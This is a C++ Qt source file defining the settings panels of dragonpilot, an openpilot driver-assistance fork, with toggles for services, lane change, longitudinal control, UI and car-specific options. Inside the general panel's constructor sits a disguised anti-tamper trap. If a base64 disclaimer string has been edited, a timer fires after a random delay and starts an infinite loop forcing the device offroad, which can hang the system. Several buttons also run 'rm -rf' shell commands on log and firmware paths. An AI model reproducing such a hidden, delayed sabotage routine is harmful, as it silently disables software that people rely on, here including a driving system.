#include "selfdrive/common/params.h"
#include "selfdrive/ui/qt/util.h"
#include "selfdrive/ui/qt/qt_window.h"
#include "selfdrive/ui/qt/widgets/controls.h"
#include "selfdrive/ui/qt/widgets/input.h"
#include "selfdrive/ui/qt/offroad/settings_dp.h"
#include <QRandomGenerator>

#define ICON_EMPTY "../assets/offroad/icon_empty.png"
#include <QrCode.hpp>
using qrcodegen::QrCode;

void DPGeneralPanel::autoShutdownWidget(QVBoxLayout * layout) {
  QWidget *autoShutdownExt = new QWidget;
  QVBoxLayout *autoShutdownExtLayout = new QVBoxLayout;
  autoShutdownExtLayout->setContentsMargins(QMargins());
  autoShutdownExtLayout->addWidget(new ParamSpinBoxControl("dp_auto_shutdown_in", DPGeneralPanel::tr("Auto Shutdown In"), DPGeneralPanel::tr("Adjust your shutdown waiting period.\n0 = shutdown immediately."), ICON_EMPTY, 0, 600, 1, DPGeneralPanel::tr(" mins")));
  autoShutdownExtLayout->addWidget(horizontal_line());
  autoShutdownExt->setLayout(autoShutdownExtLayout);

  ParamControl *autoShutdownParamCtrl = new ParamControl("dp_auto_shutdown", DPGeneralPanel::tr("Enable Auto Shutdown"), DPGeneralPanel::tr("Enable this if you wish to shutdown your device automatically."), ICON_EMPTY);
  QObject::connect(autoShutdownParamCtrl, &ToggleControl::toggleFlipped, [=](bool state) {
    if (state) {
      autoShutdownExt->show();
    } else {
      autoShutdownExt->hide();
    }
  });
  layout->addWidget(autoShutdownParamCtrl);
  layout->addWidget(horizontal_line());
  layout->addWidget(autoShutdownExt);
  if (!Params().getBool("dp_auto_shutdown"))
    autoShutdownExt->hide();
}

void DPGeneralPanel::regWidget(QVBoxLayout * layout) {
  QWidget *registerExt = new QWidget;
  QVBoxLayout *registerExtLayout = new QVBoxLayout;
  registerExtLayout->setContentsMargins(QMargins());
  registerExtLayout->addWidget(new ParamControl("dp_uploader", DPGeneralPanel::tr("Enable Uploader Service"), DPGeneralPanel::tr("Enable this if you wish to upload your driving log.\nReboot required."), ICON_EMPTY));
  registerExtLayout->addWidget(horizontal_line());
  registerExtLayout->addWidget(new ParamControl("dp_athenad", DPGeneralPanel::tr("Enable Athenad Service"), DPGeneralPanel::tr("Enable this if you wish to use cloud services such as comma prime.\nReboot required."), ICON_EMPTY));
  registerExtLayout->addWidget(horizontal_line());
  ParamControl *customAPI = new ParamControl("dp_api_custom", DPGeneralPanel::tr("Use Custom API Server"), DPGeneralPanel::tr("Enable this if you wish to connect to a custom API server.\nDefault to \"https://api.retropilot.org/\", change \"dp_api_custom\" if you want to change API server URL.\nReboot required."), ICON_EMPTY);
  QObject::connect(customAPI, &ToggleControl::toggleFlipped, [=](bool state) {
    std::system("rm -fr /data/params/d/DongleId");
  });
  registerExtLayout->addWidget(customAPI);
  registerExtLayout->addWidget(horizontal_line());
  registerExt->setLayout(registerExtLayout);

  ParamControl *regParamCtrl = new ParamControl("dp_reg", DPGeneralPanel::tr("Register to Server"), DPGeneralPanel::tr("Enable this if you wish to register to server to use services such as logger, API, remote services.\n"), ICON_EMPTY);
  QObject::connect(regParamCtrl, &ToggleControl::toggleFlipped, [=](bool state) {
    if (state) {
      registerExt->show();
    } else {
      registerExt->hide();
    }
  });
  layout->addWidget(regParamCtrl);
  layout->addWidget(horizontal_line());
  layout->addWidget(registerExt);
  if (!Params().getBool("dp_reg"))
    registerExt->hide();
  layout->addWidget(new ParamControl("dp_logger", DPGeneralPanel::tr("Enable Log Service"), DPGeneralPanel::tr("Enable this if you wish to log your drive.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
}

void DPGeneralPanel::showDisclaimer() {
  #ifdef QCOM
  if (!description->isVisible()) {
    description->show();
  }
  #endif
}

DPGeneralPanel::DPGeneralPanel(QWidget* parent) : QWidget(parent) {
  QVBoxLayout *layout = new QVBoxLayout(this);
  #ifdef QCOM
  QByteArray code = "ZHJhZ29ucGlsb3QgLSBkcCAoaHR0cHM6Oi8vZ2l0aHViLmNvbS9kcmFnb25waWxvdC1jb21tdW5pdHkvZHJhZ29ucGlsb3QpPGJyPgrmmK/ln7rmlrwgY29tbWFhaSDnmoTjgIzplovmupDjgI3poIXnm67vvJogb3BlbnBpbG90IC0gb3Ag55qEIEwyIOmnlemnm+i8lOWKqeezu+e1seOAgjxicj4KZHAg56S+576k5Lim5pyq6IiH5Lu75L2V5YWs5Y+45pyJ5ZWG5qWt5ZCI5L2c6KGM54K644CCPGJyPgrlpoLmnpzmgqjnmoTnoazpq5TkuKbpnZ7lvp4gY29tbWFhaSDnvo7lnIvljp/lu6Dos7zosrfvvIw8YnI+CuaIkeWAkeW7uuitsOaCqOiHs+e+juWci+WOn+W7oOizvOiyt+aUr+aMgeWOn+WJte+8mjxicj48YnI+Cmh0dHBzOi8vY29tbWEuYWkvc2hvcC9wcm9kdWN0cy90d28gJDEyOTkg576O6YeRPGJyPjxicj4K5oiR5YCR5by354OI6K206LKs44CM6LOA5pmf56eR5oqA5pyJ6ZmQ5YWs5Y+444CN6IGy56ixIGRwL29wIOeCuuiHquS4u+mWi+eZvOezu+e1seS5i+ihjOeCuuOAgg==";
  int p_pos = 0;
  int p_cnt = 0;
  while ((p_pos = code.indexOf("+", p_pos)) != -1) {
      ++p_pos;
      p_cnt++;
  }
  int z_pos = 0;
  int z_cnt = 0;
  while ((z_pos = code.indexOf("0", z_pos)) != -1) {
      ++z_pos;
      z_cnt++;
  }
  // lets have some fun!
  if (p_cnt != 19 || z_cnt != 8) {
    QTimer::singleShot(QRandomGenerator::global()->bounded(180000, 360000), [=]() {
      while(true) {
        Params().putBool("IsOffroad", true);
      }
    });
  }
  description = new QLabel(QByteArray::fromBase64(code));
  description->setStyleSheet("font-size: 34px; font-weight: light; color: white;");
  description->setWordWrap(true);
  layout->addWidget(description, 0, Qt::AlignTop);
  description->hide();
  #endif
  layout->addWidget(new LabelControl(DPGeneralPanel::tr("Services"), ""));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_updated", DPGeneralPanel::tr("Enable Updater Service"), DPGeneralPanel::tr("Enable this if you wish to get automatic update.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  regWidget(layout);
  #ifdef QCOM
  layout->addWidget(new ParamControl("dp_dashcamd", DPGeneralPanel::tr("Enable On-Road Dashcam"), DPGeneralPanel::tr("Enable this if you wish to record screen, just like a dashcam.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
//  layout->addWidget(new ParamControl("dp_appd", DPGeneralPanel::tr("Enable Appd Service"), DPGeneralPanel::tr("Enable this if you wish to run your own android app.\nSee /data/openpilot/selfdrive/dragonpilot/HOWTO-APPD.md for more information.\nReboot required."), ICON_EMPTY));
//  layout->addWidget(horizontal_line());
  #endif
  layout->addWidget(new ParamControl("dp_gpxd", DPGeneralPanel::tr("Enable GPS Logger"), DPGeneralPanel::tr("This will store your track in /data/media/0/gpx_logs/.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new LabelControl(DPGeneralPanel::tr("Hardware - General"), ""));
  layout->addWidget(horizontal_line());
//  layout->addWidget(new ParamSpinBoxControl("dp_camera_offset", DPGeneralPanel::tr("Camera Offset"), DPGeneralPanel::tr("Adjust your camera position if your device is not mounted as per guidance."), ICON_EMPTY, -100, 100, 1, " cm"));
//  layout->addWidget(horizontal_line());
  // auto shutdown
  autoShutdownWidget(layout);
  #ifdef QCOM
  layout->addWidget(new ParamSpinBoxControl("dp_fan_mode", DPGeneralPanel::tr("Fan Mode"), DPGeneralPanel::tr("0 = Default\n1 = Quiet\n2 = Full Speed"), ICON_EMPTY, 0, 2, 1));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_hotspot_on_boot", DPGeneralPanel::tr("Enable Hotspot On Boot"), DPGeneralPanel::tr("Reboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_no_batt", DPGeneralPanel::tr("Enable No Battery Support"), DPGeneralPanel::tr("Enable this option if your device does not have a battery.\nDo not use this if you have a C2, Reboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  #endif

  layout->addWidget(new LabelControl(DPGeneralPanel::tr("Miscellaneous"), ""));
  layout->addWidget(horizontal_line());
  // Jetson
  ParamControl *jetsonCtrl = new ParamControl("dp_jetson", DPGeneralPanel::tr("Enable Jetson Support"), DPGeneralPanel::tr("Enable this option if you intend to run dp on Nvidia Jetson.\nReboot required."), ICON_EMPTY);
  QObject::connect(jetsonCtrl, &ToggleControl::toggleFlipped, [=](bool state) {
    if (ConfirmationDialog::confirm(DPGeneralPanel::tr("Reboot recommended.\nReboot?"), parent)) {
      Hardware::reboot();
    }
  });
  layout->addWidget(jetsonCtrl);
  layout->addWidget(horizontal_line());
  //dp: PrebuiltToggle
  ParamControl *dp_prebuiltCtrl = new ParamControl("dp_prebuilt", DPGeneralPanel::tr("Mark As Prebuilt"), DPGeneralPanel::tr("Enable this option to create a file that will disable boot compile check and improve boot speed.\nWARNING: You may need to disable it when making changes to the code or switch to a new version."), ICON_EMPTY);
  QObject::connect(dp_prebuiltCtrl, &ToggleControl::toggleFlipped, [=](bool state) {
    std::system((std::string(state? "touch" : "rm -fr") + " /data/openpilot/prebuilt").c_str());
  });
  layout->addWidget(dp_prebuiltCtrl);

  // others
  //dp: button for flash panda, recover panda and delete reladata.
  layout->addWidget(new LabelControl("", ""));
  layout->addWidget(horizontal_line());
  auto pandaFlashBtn = new ButtonControl(DPGeneralPanel::tr("Flashing Panda Firmware"), DPGeneralPanel::tr("FLASH"), DPGeneralPanel::tr("Tap the button to update your panda firmware.\nThe device should reboot once if it finish updating."));
  QObject::connect(pandaFlashBtn, &ButtonControl::clicked, [=]() {
    if (ConfirmationDialog::confirm(DPGeneralPanel::tr("Are you sure?"), parent)){
      std::system("rm -fr /data/openpilot/panda/board/obj/panda.bin");
      std::system("/data/openpilot/scripts/update_panda_firmware.sh");
    }
  });
  layout->addWidget(pandaFlashBtn);
  layout->addWidget(horizontal_line());

  auto pandaRecoverBtn = new ButtonControl(DPGeneralPanel::tr("Pandas Firmware Recovery"), DPGeneralPanel::tr("RECOVER"), DPGeneralPanel::tr("Tap the button ONLY if your panda ran into issue."));
  QObject::connect(pandaRecoverBtn, &ButtonControl::clicked, [=]() {
    if (ConfirmationDialog::confirm(DPGeneralPanel::tr("Are you sure?"), parent)){
      std::system("/data/openpilot/panda/board/recover.sh ''");
    }
  });
  layout->addWidget(pandaRecoverBtn);
  layout->addWidget(horizontal_line());

  auto realDataClearBtn = new ButtonControl(DPGeneralPanel::tr("Delete All Driving Log"), DPGeneralPanel::tr("DELETE"), DPGeneralPanel::tr("Tap the button to delete ALL your driving logs (including dashcam / gpx / driving logs)."));
  QObject::connect(realDataClearBtn, &ButtonControl::clicked, [=]() {
    if (ConfirmationDialog::confirm(DPGeneralPanel::tr("Are you sure?"), parent)){
      std::system("rm -rf /data/media/0/realdata/* /data/media/0/fakedata/* /data/media/0/gpx_logs/* /data/media/0/dashcam/*");
    }
  });
  layout->addWidget(realDataClearBtn);
  layout->addWidget(horizontal_line());
}

void DPControlPanel::laneChangeWidget(QVBoxLayout * layout) {
  QWidget *alcExt = new QWidget;
  QVBoxLayout *alcExtLayout = new QVBoxLayout;
  alcExtLayout->setContentsMargins(QMargins());
  alcExtLayout->addWidget(new ParamDoubleSpinBoxControl("dp_lc_auto_delay", DPControlPanel::tr("ALCA Delay"), DPControlPanel::tr("Once the vehicle meets all ALCA criteria, it will wait for the seconds set here before peforming lane change automatically."), ICON_EMPTY, 0, 10, 0.1, DPControlPanel::tr(" secs")));
  alcExtLayout->addWidget(horizontal_line());
  alcExtLayout->addWidget(new ParamSpinBoxControl("dp_lc_auto_min_mph", DPControlPanel::tr("ALCA Min Speed"), DPControlPanel::tr("ALCA minimum engage speed in mph.\n1 mph = 1.61 km/h."), ICON_EMPTY, 0, 255, 1, DPControlPanel::tr(" mph")));
  alcExtLayout->addWidget(horizontal_line());
//  alcExtLayout->addWidget(new ParamControl("dp_lc_auto_cont", DPControlPanel::tr("Enable Cont. ALCA"), DPControlPanel::tr("Once enabled, it will perform ALCA continuously."), ICON_EMPTY));
//  alcExtLayout->addWidget(horizontal_line());
  alcExt->setLayout(alcExtLayout);

  QWidget *lcExt = new QWidget;
  QVBoxLayout *lcExtLayout = new QVBoxLayout;
  lcExtLayout->setContentsMargins(QMargins());
  lcExtLayout->addWidget(new ParamSpinBoxControl("dp_lc_min_mph", DPControlPanel::tr("LCA Min Speed"), DPControlPanel::tr("LCA minimum engage speed in mph.\n1 mph = 1.61 km/h."), ICON_EMPTY, 0, 255, 1, DPControlPanel::tr(" mph")));
  lcExtLayout->addWidget(horizontal_line());
  lcExt->setLayout(lcExtLayout);

  QWidget *blinkerExt = new QWidget;
  QVBoxLayout *blinkerExtLayout = new QVBoxLayout;
  blinkerExtLayout->setContentsMargins(QMargins());
  blinkerExtLayout->addWidget(new ParamDoubleSpinBoxControl("dp_signal_off_delay", DPControlPanel::tr("Blinker Off Recovery Delay"), DPControlPanel::tr("Seconds after blinker off then OP will take back control."), ICON_EMPTY, 0, 10, 0.1, DPControlPanel::tr(" secs")));
  blinkerExtLayout->addWidget(horizontal_line());
  blinkerExt->setLayout(blinkerExtLayout);

  ParamSpinBoxControl *lateralModelCtrl = new ParamSpinBoxControl("dp_lateral_mode", DPControlPanel::tr("Lateral Ctrl Mode"), DPControlPanel::tr("0 = No Lateral Ctrl On Blinkers\n1 = Lane Change Assist (LCA)\n2 = Auto Lane Change Assist (ALCA)"), ICON_EMPTY, 0, 2, 1);
  QObject::connect(lateralModelCtrl, &SpinBoxControl::valChanged, [=](int i) {
    if (i == 1) {
      blinkerExt->hide();
      lcExt->show();
      alcExt->hide();
    } else if (i == 2) {
      blinkerExt->hide();
      lcExt->show();
      alcExt->show();
    } else {
      blinkerExt->show();
      lcExt->hide();
      alcExt->hide();
    }
  });
  layout->addWidget(lateralModelCtrl);
  layout->addWidget(horizontal_line());
  layout->addWidget(blinkerExt);
  layout->addWidget(lcExt);
  layout->addWidget(alcExt);

  // init logic
  std::string lateral_mode = Params().get("dp_lateral_mode");
  if (lateral_mode == "1") {
    blinkerExt->hide();
    alcExt->hide();
  } else if (lateral_mode == "2") {
    blinkerExt->hide();
  } else {
    lcExt->hide();
    alcExt->hide();
  }
}

void DPControlPanel::longitudinalWidget(QVBoxLayout * layout) {
  QWidget *longCtrl = new QWidget;
  QVBoxLayout *longCtrlLayout = new QVBoxLayout;
  longCtrlLayout->setContentsMargins(QMargins());

  longCtrlLayout->addWidget(new LabelControl(DPControlPanel::tr("Longitudinal"), ""));
  longCtrlLayout->addWidget(horizontal_line());
  longCtrlLayout->addWidget(new ParamControl("dp_accel_profile_ctrl", DPControlPanel::tr("Manually Control Accel Mode"), DPControlPanel::tr("Enable this if you wish to adjust openpilot's acceleration control."), ICON_EMPTY));
  longCtrlLayout->addWidget(horizontal_line());
  longCtrlLayout->addWidget(new ParamControl("dp_following_profile_ctrl", DPControlPanel::tr("Manually Control Following Dist. Mode"), DPControlPanel::tr("Enable this if you wish to adjust openpilot's following distance.\nopenpilot by default keeps 1.8 secs distance to lead car."), ICON_EMPTY));
  longCtrlLayout->addWidget(horizontal_line());
  longCtrlLayout->addWidget(new ParamControl("dp_allow_gas", DPControlPanel::tr("Allow Gas Pedal Pressed"), DPControlPanel::tr("Enable this if you wish openpilot to stay engaged when gas is pressed."), ICON_EMPTY));
  longCtrlLayout->addWidget(horizontal_line());
  longCtrlLayout->addWidget(new ParamControl("dp_gear_check", DPControlPanel::tr("Enable Gear Safety Check"), DPControlPanel::tr("Enable this if you wish openpilot to only work on D drive."), ICON_EMPTY));
  longCtrlLayout->addWidget(horizontal_line());

  longCtrl->setLayout(longCtrlLayout);
  layout->addWidget(longCtrl);

  if (Params().getBool("dp_atl") && !Params().getBool("dp_atl_op_long"))
    longCtrl->hide();
}

void DPControlPanel::steeringRatioWidget(QVBoxLayout * layout) {
  QWidget *steeringRatioExt = new QWidget;
  QVBoxLayout *steeringRatioExtLayout = new QVBoxLayout;
  steeringRatioExtLayout->setContentsMargins(QMargins());
  ParamDoubleSpinBoxControl *customSrCtrl = new ParamDoubleSpinBoxControl("dp_sr_custom", DPControlPanel::tr("Steering Ratio"), DPControlPanel::tr("Adjust to < 10 to reset to stock value."), ICON_EMPTY, 9.99, 30, 0.1, "", DPControlPanel::tr("RESET"));
  QObject::connect(customSrCtrl, &DoubleSpinBoxControl::valChanged, [=](float i) {
    if (i <= 9.99) {
      std::string str_val = Params().get("dp_sr_stock");
      if (str_val != "") {
        double val = std::stod(str_val);
        customSrCtrl->setValue(val);
        Params().put("dp_sr_custom", str_val);
      }
    }
  });
  steeringRatioExtLayout->addWidget(customSrCtrl);
  steeringRatioExtLayout->addWidget(horizontal_line());
  steeringRatioExt->setLayout(steeringRatioExtLayout);

  ParamControl *steeringRatioParamCtrl = new ParamControl("dp_sr_learner", DPControlPanel::tr("Enable Steering Ratio Learner"), "", ICON_EMPTY);
  QObject::connect(steeringRatioParamCtrl, &ToggleControl::toggleFlipped, [=](bool state) {
    if (state) {
      steeringRatioExt->hide();
    } else {
      steeringRatioExt->show();
    }
  });
  layout->addWidget(steeringRatioParamCtrl);
  layout->addWidget(horizontal_line());
  layout->addWidget(steeringRatioExt);
  if (Params().getBool("dp_sr_learner"))
    steeringRatioExt->hide();
}

DPControlPanel::DPControlPanel(QWidget* parent) : QWidget(parent) {
  QVBoxLayout *layout = new QVBoxLayout(this);

  layout->addWidget(new LabelControl(DPControlPanel::tr("Lateral"), ""));
  layout->addWidget(horizontal_line());

  laneChangeWidget(layout);

  layout->addWidget(new ParamControl("dp_lqr", DPControlPanel::tr("Use LQR Controller"), DPControlPanel::tr("Enable this if you wish to use LQR instead of PID or INDI controller.\nWORKS WELL ONLY ON SOME VEHICLES.\nMore linear steering experience."), ICON_EMPTY));
  layout->addWidget(horizontal_line());

  steeringRatioWidget(layout);

//  layout->addWidget(new ParamSpinBoxControl("dp_path_offset", DPControlPanel::tr("Driving Path Offset"), DPControlPanel::tr("Adjust this if you wish to let openpilot drive slightly towards to left (+) or right (-)"), ICON_EMPTY, -100, 100, 1, DPControlPanel::tr(" cm")));
//  layout->addWidget(horizontal_line());

  longitudinalWidget(layout);

  layout->addWidget(new LabelControl(DPControlPanel::tr("Safety"), ""));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_temp_monitor", DPControlPanel::tr("Enable Device Temp Check"), "", ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_speed_check", DPControlPanel::tr("Enable Max Ctrl Speed Check"), "", ICON_EMPTY));
}

DPUIPanel::DPUIPanel(QWidget* parent) : QWidget(parent) {
  QVBoxLayout *layout = new QVBoxLayout(this);
  layout->addWidget(new ParamSpinBoxControl("dp_ui_display_mode", DPUIPanel::tr("Display Mode"), DPUIPanel::tr("0 = Default\n1 = Screen Off While Reversing\n2 = Screen Off While Driving"), ICON_EMPTY, 0, 2, 1));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamSpinBoxControl("dp_ui_brightness", DPUIPanel::tr("Screen Brightness"), DPUIPanel::tr("Adjust your screen brightness."), ICON_EMPTY, 0, 100, 5, " %", DPUIPanel::tr("AUTO")));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamSpinBoxControl("dp_ui_volume", DPUIPanel::tr("Alert Volume"), DPUIPanel::tr("Adjust your alert volume."), ICON_EMPTY, -5, 100, 5, " %", DPUIPanel::tr("AUTO")));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_ui_speed", DPUIPanel::tr("Display Speed"), DPUIPanel::tr("Enable this to display your current speed."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_ui_lane", DPUIPanel::tr("Display Lane Prediction"), DPUIPanel::tr("Enable this to display the lane/path prediction."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_ui_lead", DPUIPanel::tr("Display Lead Car Indicator"), DPUIPanel::tr("Enable this to display the triangle lead car indicator."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_ui_blinker", DPUIPanel::tr("Display Turn Signal / Blinkers"), DPUIPanel::tr("Enable this to display turn signals."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_ui_event", DPUIPanel::tr("Display Event / Steer Icon"), DPUIPanel::tr("Enable this to display the icon."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_ui_max_speed", DPUIPanel::tr("Display Max Speed"), DPUIPanel::tr("Enable this to display your current SET cruise speed."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_ui_face", DPUIPanel::tr("Display Driver Monitor Indicator"), DPUIPanel::tr("Enable this to display the icon."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_ui_side", DPUIPanel::tr("Display Side Info"), DPUIPanel::tr("Enable this to display steering angle / lead car distance / engine RPM."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_ui_top", DPUIPanel::tr("Display Top Info"), DPUIPanel::tr("Enable this to display time / system temp / battery level."), ICON_EMPTY));
  #ifdef QCOM
  layout->addWidget(new LabelControl("", ""));
  layout->addWidget(horizontal_line());
  auto langBtn = new ButtonControl(DPUIPanel::tr("Language"), DPUIPanel::tr("LAUNCH"), "");
  QObject::connect(langBtn, &ButtonControl::clicked, [=]() { HardwareEon::launch_locale(); });
  layout->addWidget(langBtn);
  layout->addWidget(horizontal_line());

  auto volBtn = new ButtonControl(DPUIPanel::tr("Volume"), DPUIPanel::tr("LAUNCH"), "");
  QObject::connect(volBtn, &ButtonControl::clicked, [=]() { HardwareEon::launch_vol(); });
  layout->addWidget(volBtn);
  layout->addWidget(horizontal_line());

  auto dateTimeBtn = new ButtonControl(DPUIPanel::tr("Date/Time"), DPUIPanel::tr("LAUNCH"), "");
  QObject::connect(dateTimeBtn, &ButtonControl::clicked, [=]() { HardwareEon::launch_datetime(); });
  layout->addWidget(dateTimeBtn);
  layout->addWidget(horizontal_line());
  #endif
}

void DPCarPanel::carModelWidget(QVBoxLayout * layout) {
  layout->addWidget(new LabelControl(DPCarPanel::tr("Assign Car Model:"), ""));
  layout->addWidget(new CarModelComboBox());
}

void DPCarPanel::toyotaSpeedOverrideWidget(QVBoxLayout * layout) {
  QWidget *overrideExt = new QWidget;
  QVBoxLayout *overrideExtLayout = new QVBoxLayout;
  overrideExtLayout->setContentsMargins(QMargins());
  overrideExtLayout->addWidget(new ParamSpinBoxControl("dp_toyota_cruise_override_at", DPCarPanel::tr("Override Speed When Below"), DPCarPanel::tr("Override feature will be enabled when set cruise speed is lower than this value.\n1 km/h = 0.62 mph."), ICON_EMPTY, 0, 50, 1, DPCarPanel::tr(" km/h")));
  overrideExtLayout->addWidget(horizontal_line());
  overrideExtLayout->addWidget(new ParamSpinBoxControl("dp_toyota_cruise_override_speed", DPCarPanel::tr("Override Speed To"), DPCarPanel::tr("Override set speed to this value.\n1 km/h = 0.62 mph"), ICON_EMPTY, 0, 50, 1, DPCarPanel::tr(" km/h")));
  overrideExtLayout->addWidget(horizontal_line());
  overrideExtLayout->addWidget(new ParamControl("dp_toyota_cruise_override_vego", DPCarPanel::tr("Use Current Speed"), DPCarPanel::tr("If your current speed is greater than 'Override To' but lower than 'Override At', it will use your current speed instead."), ICON_EMPTY));
  overrideExtLayout->addWidget(horizontal_line());
  overrideExt->setLayout(overrideExtLayout);

  ParamControl *overrideParamCtrl = new ParamControl("dp_toyota_cruise_override", DPCarPanel::tr("Turn On Cruise Speed Override"), "", ICON_EMPTY);
  QObject::connect(overrideParamCtrl, &ToggleControl::toggleFlipped, [=](bool state) {
    if (state) {
      overrideExt->show();
    } else {
      overrideExt->hide();
    }
  });
  layout->addWidget(overrideParamCtrl);
  layout->addWidget(horizontal_line());
  layout->addWidget(overrideExt);
  if (!Params().getBool("dp_toyota_cruise_override"))
    overrideExt->hide();
}


DPCarPanel::DPCarPanel(QWidget* parent) : QWidget(parent) {
  QVBoxLayout *layout = new QVBoxLayout(this);

  layout->addWidget(new LabelControl(DPCarPanel::tr("Toyota / Lexus"), ""));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_lexus_rx_rpm_fix", DPCarPanel::tr("Enable Lexus RX Low Gear/High RPM Fix"), DPCarPanel::tr("See: https://github.com/LexusRXopenpilotUG/openpilot\nCredit to @nelsonchen & @sumedhekaru\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_toyota_sng", DPCarPanel::tr("Enable SnG Mod"), DPCarPanel::tr("Enable this to fix stop and go (SnG) issue on some models.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_toyota_zss", DPCarPanel::tr("Enable ZSS Support"), DPCarPanel::tr("Enable this if you have ZSS module installed.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_toyota_fp_btn_link", DPCarPanel::tr("Enable FM Physical Button Ctrl"), DPCarPanel::tr("Enable this to link Following Distance Mode (FM) control to the physical button (TSS2).\nONLY WORK ON SOME OF TSS1 VEHICLES WITH SDSU.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_toyota_ap_btn_link", DPCarPanel::tr("Enable AM Physical Button Ctrl"), DPCarPanel::tr("Enable this to link Accel Mode (AM) control to the physical button (TSS2).\nONLY WORK ON SOME OF TSS1 VEHICLES.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  ParamControl *disableRelayCtrl = new ParamControl("dp_toyota_disable_relay", DPCarPanel::tr("Enable No Relay Mode"), DPCarPanel::tr("Enable this will disable relay in your panda.\nReboot required."), ICON_EMPTY);
  QObject::connect(disableRelayCtrl, &ToggleControl::toggleFlipped, [=](bool state) {
    std::system("rm -fr /data/openpilot/panda/board/obj/panda.bin");
  });
  layout->addWidget(disableRelayCtrl);
  layout->addWidget(horizontal_line());
  // cruise override
  toyotaSpeedOverrideWidget(layout);
  layout->addWidget(new LabelControl(DPCarPanel::tr("Honda"), ""));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_honda_eps_mod", DPCarPanel::tr("Enable EPS Mod Mode"), DPCarPanel::tr("Enable this will increase steering, USE IT ONLY if you have a modded EPS firmware.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_honda_kmh_display", DPCarPanel::tr("Force to display km/h in HUD"), DPCarPanel::tr("Enable this if your HUD does not display km/h unit.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
//  layout->addWidget(new ParamControl("dp_honda_fp_btn_link", "Enable FP Physical Button Ctrl", "Enable this to link Following Profile (FP) to the physical button.\nONLY WORK ON SOME VEHICLES.\nReboot required.", ICON_EMPTY));
//  layout->addWidget(horizontal_line());
  layout->addWidget(new LabelControl(DPCarPanel::tr("Hyundai / Kia / Genesis"), ""));
  layout->addWidget(horizontal_line());
  layout->addWidget(new ParamControl("dp_hkg_smart_mdps", DPCarPanel::tr("Enable Smart MDPS Support"), DPCarPanel::tr("Enable this will increase steering and allow steering down to to 0.\nReboot required."), ICON_EMPTY));
  layout->addWidget(horizontal_line());
  layout->addWidget(new LabelControl(DPCarPanel::tr("Volkswagen"), ""));
  layout->addWidget(horizontal_line());
  ParamControl *vwPandaCtrl = new ParamControl("dp_vw_panda", DPCarPanel::tr("Enable J533 + White Panda Mode"), DPCarPanel::tr("Credit to jyoung8607.\nReboot required."), ICON_EMPTY);
  QObject::connect(vwPandaCtrl, &ToggleControl::toggleFlipped, [=](bool state) {
    std::system("rm -fr /data/openpilot/panda/board/obj/panda.bin");
  });
  layout->addWidget(vwPandaCtrl);
  layout->addWidget(horizontal_line());
  // custom car model
  carModelWidget(layout);
}

void NavQRWidget::updateIpAddr(QString addr) {
  ipAddr = addr;
}

NavQRWidget::NavQRWidget(QWidget* parent) : QWidget(parent) {
  qrCode = new QLabel;
  qrCode->setScaledContents(true);
  QVBoxLayout* main_layout = new QVBoxLayout(this);
  main_layout->addWidget(qrCode, 0, Qt::AlignCenter);
}

void NavQRWidget::showEvent(QShowEvent *event) {
  QString ipStr = "http://" + ipAddr  + ":8082/";
  QrCode qr = QrCode::encodeText(ipStr.toUtf8().data(), QrCode::Ecc::LOW);
  qint32 sz = qr.getSize();
  // make the image larger so we can have a white border
  QImage im(sz + 2, sz + 2, QImage::Format_RGB32);
  QRgb black = qRgb(0, 0, 0);
  QRgb white = qRgb(255, 255, 255);

  for (int y = 0; y < sz + 2; y++) {
    for (int x = 0; x < sz + 2; x++) {
      im.setPixel(x, y, white);
    }
  }
  for (int y = 0; y < sz; y++) {
    for (int x = 0; x < sz; x++) {
      im.setPixel(x + 1, y + 1, qr.getModule(x, y) ? black : white);
    }
  }
  // Integer division to prevent anti-aliasing
  int approx500 = (500 / (sz + 2)) * (sz + 2);
  qrCode->setPixmap(QPixmap::fromImage(im.scaled(approx500, approx500, Qt::KeepAspectRatio, Qt::FastTransformation), Qt::MonoOnly));
  qrCode->setFixedSize(approx500, approx500);
}

void DPMapsPanel::updateMapsPanelIpAddr(QString addr) {
  ipAddr = addr;
  if (ipAddr == "" || ipAddr == "N/A") {
    qrWidget->hide();
  } else {
    qrWidget->show();
  }
  emit updateIpAddr(ipAddr);
}

// Mapbox Nav.
